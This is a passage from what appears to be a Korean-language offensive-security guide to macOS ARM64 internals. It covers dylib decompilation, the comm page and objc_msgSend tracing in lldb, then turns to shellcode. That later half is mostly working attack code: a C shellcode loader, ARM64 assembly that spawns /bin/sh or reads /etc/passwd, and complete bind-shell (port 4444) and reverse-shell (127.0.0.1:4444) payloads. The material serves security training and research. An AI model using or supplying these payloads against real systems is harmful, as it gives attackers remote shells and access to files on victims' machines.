`**Ida**`와 `**Ghidra**`는 cache를 전달하기만 해도 cache에서 **특정 dylibs**를 decompile할 수 있다는 점에 유의하세요.

> [!TIP]
> 때로는 **source code**를 확인하는 것보다 **`libsystem_kernel.dylib`**에서 **decompiled** code를 확인하는 것이 더 쉽습니다. 여러 syscall(BSD 및 Mach)의 code가 script를 통해 생성되기 때문입니다(source code의 주석 확인). 반면 dylib에서는 실제로 무엇이 호출되는지 확인할 수 있습니다.

### machdep calls

XNU는 machine dependent라고 불리는 또 다른 유형의 call을 지원합니다. 이러한 call의 번호는 architecture에 따라 달라지며, call이나 번호가 계속 일정하게 유지된다는 보장도 없습니다.

### comm page

이는 kernel이 소유한 memory page로, 모든 users process의 address space에 매핑됩니다. 너무 자주 사용되어 이러한 전환이 매우 비효율적일 수 있는 kernel service에 대해서는 syscall을 사용하는 것보다 user mode에서 kernel space로의 전환을 더 빠르게 수행하기 위한 것입니다.

예를 들어 `gettimeofdate` call은 comm page에서 `timeval` 값을 직접 읽습니다.

### objc_msgSend

Objective-C 또는 Swift program에서 이 function이 사용된 것을 매우 흔하게 볼 수 있습니다. 이 function을 사용하면 Objective-C object의 method를 호출할 수 있습니다.

Parameters ([docs의 자세한 정보](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):<sup>[[4]](#references)</sup>

- x0: self -> instance를 가리키는 Pointer
- x1: op -> method의 Selector
- x2... -> 호출된 method의 나머지 arguments

따라서 이 function으로 분기하기 전에 breakpoint를 설정하면, 다음과 같이 lldb에서 무엇이 호출되는지 쉽게 확인할 수 있습니다(이 예제에서 object는 command를 실행할 `NSConcreteTask`의 object를 호출합니다):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> env variable **`NSObjCMessageLoggingEnabled=1`**을 설정하면 `/tmp/msgSends-pid`와 같은 파일에 이 함수가 호출될 때를 log할 수 있습니다.
>
> 또한 **`OBJC_HELP=1`**을 설정하고 임의의 binary를 호출하면 특정 Objc-C 동작이 발생할 때 **log**하는 데 사용할 수 있는 다른 environment variable를 확인할 수 있습니다.

이 함수가 호출되면 지정된 instance에서 호출된 method를 찾아야 하며, 이를 위해 다음과 같은 여러 검색이 수행됩니다:

- Perform optimistic cache lookup:
- 성공하면 종료
- Acquire runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Try class own cache:
- 성공하면 종료
- Try class method list:
- 찾으면 cache를 채우고 종료
- Try superclass cache:
- 성공하면 종료
- Try superclass method list:
- 찾으면 cache를 채우고 종료
- If (resolver) try method resolver, and repeat from class lookup
- 여전히 여기까지 왔다면 (= 다른 모든 방법이 실패했다면) forwarder 시도

### Shellcodes

compile하려면:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
최신 macOS의 경우:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcode를 테스트하는 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

[**여기**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져와 설명합니다.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### cat으로 읽기

목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인자(x1)는 params 배열입니다(메모리에서는 주소들이 stack에 쌓인 형태를 의미합니다).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### fork에서 sh로 command를 실행하여 main process가 종료되지 않도록 하기
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

[https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)의 **port 4444**에서 실행되는 Bind shell<sup>[[2]](#references)</sup>입니다.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)에서 **127.0.0.1:4444**로 revshell<sup>[[3]](#references)</sup>
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## 참고 자료

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
- [4] [Apple Developer - 712 Objc Msgsend](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)

{{#include ../../../banners/hacktricks-training.md}}
